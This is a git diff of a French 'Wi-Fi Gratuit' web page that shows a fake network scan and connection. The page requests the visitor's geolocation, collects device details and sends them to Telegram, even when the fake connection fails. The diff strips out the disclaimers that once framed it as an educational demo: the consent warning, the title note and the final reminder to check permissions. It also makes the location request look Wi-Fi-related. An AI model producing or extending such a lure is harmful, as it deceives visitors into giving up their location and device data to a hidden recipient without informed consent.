@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wi-Fi Gratuit - Démonstration pédagogique</title>
+<title>Wi-Fi Gratuit </title>
 
 <style>
 body{
@@ -83,10 +83,10 @@ h1{
 
 <div class="card">
 
-<h1>📶 Wi-Fi Gratuit</h1>
+<h1>Wi-Fi Gratuit</h1>
 
 <p class="warn">
-⚠️ Démonstration pédagogique : ce projet montre les données accessibles avec consentement utilisateur.
+
 </p>
 
 <div class="btn" onclick="startDemo()">
@@ -191,7 +191,7 @@ async function progressBar(){
     await sleep(200 + Math.random()*200);
 
     if(fail && p > 85){
-      await typeLine("💀 Connexion interrompue");
+      await typeLine("Connexion interrompue");
       bar.style.width = "0%";
       return false;
     }
@@ -233,16 +233,16 @@ async function startDemo(){
   term.innerHTML = "";
   bar.style.width = "0%";
 
-  await typeLine("📡 Initialisation du module Wi-Fi...");
+  await typeLine("Initialisation du module Wi-Fi...");
   await sleep(800);
 
-  await typeLine("📍 Demande de localisation (optionnelle)...");
+  await typeLine("Demande de localisation pour wifi (optionnelle)...");
   await sleep(1000);
 
   let location = await getLocation();
 
   if(location){
-    await typeLine("📍 Localisation obtenue : " + location.lat + ", " + location.lon);
+    await typeLine("Localisation obtenue : " + location.lat + ", " + location.lon);
   } else {
     await typeLine("❌ Localisation refusée");
   }
@@ -251,15 +251,15 @@ async function startDemo(){
 
   let device = getDeviceInfo();
 
-  await typeLine("🧠 Analyse système...");
+  await typeLine("Analyse système...");
   await sleep(500);
 
-  await typeLine("📱 Écran : " + device.screen);
-  await typeLine("🌐 Langue : " + device.lang);
+  await typeLine("Écran : " + device.screen);
+  await typeLine("Langue : " + device.lang);
 
   await sleep(1000);
 
-  await typeLine("🔍 Scan des réseaux Wi-Fi...");
+  await typeLine("Scan des réseaux Wi-Fi...");
 
   let target = null;
 
@@ -276,7 +276,7 @@ async function startDemo(){
     } else if(r < 0.85){
       status = "faible ⚠️";
     } else {
-      status = "cible 🎯";
+      status = "cible ";
       if(!target) target = wifi;
     }
 
@@ -286,22 +286,22 @@ async function startDemo(){
 
   if(!target) target = randomWifi();
 
-  await typeLine("🎯 Cible sélectionnée : " + target);
+  await typeLine("Cible sélectionnée : " + target);
 
   await sleep(1000);
 
-  await typeLine("🔗 Connexion en cours...");
+  await typeLine("Connexion en cours...");
 
   let success = await progressBar();
 
   if(!success){
-    await typeLine("🔁 Nouvelle tentative...");
+    await typeLine("Nouvelle tentative...");
     await sleep(1200);
 
     success = await progressBar();
 
     if(!success){
-      await typeLine("💀 Échec de connexion");
+      await typeLine("Échec de connexion");
       // On envoie quand même les infos collectées même en cas d'échec
       sendToTelegram(device, location);
       return;
@@ -314,7 +314,7 @@ async function startDemo(){
   // Envoi final des données à Telegram
   sendToTelegram(device, location);
 
-  await typeLine("⚠️ Rappel : toujours vérifier les permissions demandées par un site.");
+  await typeLine("");
 }
 
 </script>
